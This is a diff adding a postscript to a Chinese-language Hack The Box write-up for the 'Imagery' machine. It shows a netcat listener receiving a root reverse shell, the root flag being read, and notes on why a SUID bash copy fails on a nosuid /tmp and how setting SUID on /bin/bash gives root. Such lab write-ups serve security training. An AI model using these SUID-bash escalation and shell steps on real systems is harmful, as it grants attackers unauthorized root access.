@@ -445,7 +445,13 @@
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ nc -nvlp 4567</span><br><span class="line">Listening on 0.0.0.0 4567</span><br><span class="line">Connection received on 10.10.11.88 58874</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (67421): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">root@Imagery:~# <span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">root</span><br><span class="line">root@Imagery:~# </span><br></pre></td></tr></table></figure>
 
 <p>拿到 root flag：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@Imagery:~# <span class="built_in">cat</span> root.txt</span><br><span class="line"><span class="built_in">cat</span> root.txt</span><br><span class="line">d7b47db5ff32d49484934c074*******</span><br><span class="line">root@Imagery:~#</span><br></pre></td></tr></table></figure>]]></content>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@Imagery:~# <span class="built_in">cat</span> root.txt</span><br><span class="line"><span class="built_in">cat</span> root.txt</span><br><span class="line">d7b47db5ff32d49484934c074*******</span><br><span class="line">root@Imagery:~#</span><br></pre></td></tr></table></figure>
+
+<h3 id="PS"><a href="#PS" class="headerlink" title="PS"></a>PS</h3><p>在使用自动化任务提升到 root 的时候，我尝试把 &#x2F;bin&#x2F;bash 复制到 &#x2F;tmp 目录下，接着 <code>chmod +s /tmp/bash</code> ，发现 <code>/tmp/bash -p</code> 之后还是 mark 用户，始终无法提升到 root。</p>
+<p>询问了 AI ，他说可以使用 <code>mount | grep &quot;tmp&quot;</code> 来查看 &#x2F;tmp 目录的挂载情况，如果出现类似 <code>/dev/sda1 /tmp ext4 rw,nosuid,nodev 0 0</code> 的结果，其中的 <code>nosuid</code> 表示 SUID 在 &#x2F;tmp 目录下无效。</p>
+<p>我使用了这个方法，果然发现是 <code>tmpfs on /tmp type tmpfs (rw,nosuid,nodev,nr_inodes=1048576,inode64)</code>，所以 bash 移动到 &#x2F;tmp 目录之后，无法使用 <code>/tmp/bash -p</code> 提权。</p>
+<p>如果直接 <code>chmod +s /bin/bash</code> ，则可以使用 <code>/bin/bash -p</code> 来提升到 root 权限。</p>
+]]></content>
       <tags>
         <tag>XSS</tag>
         <tag>LFI</tag>
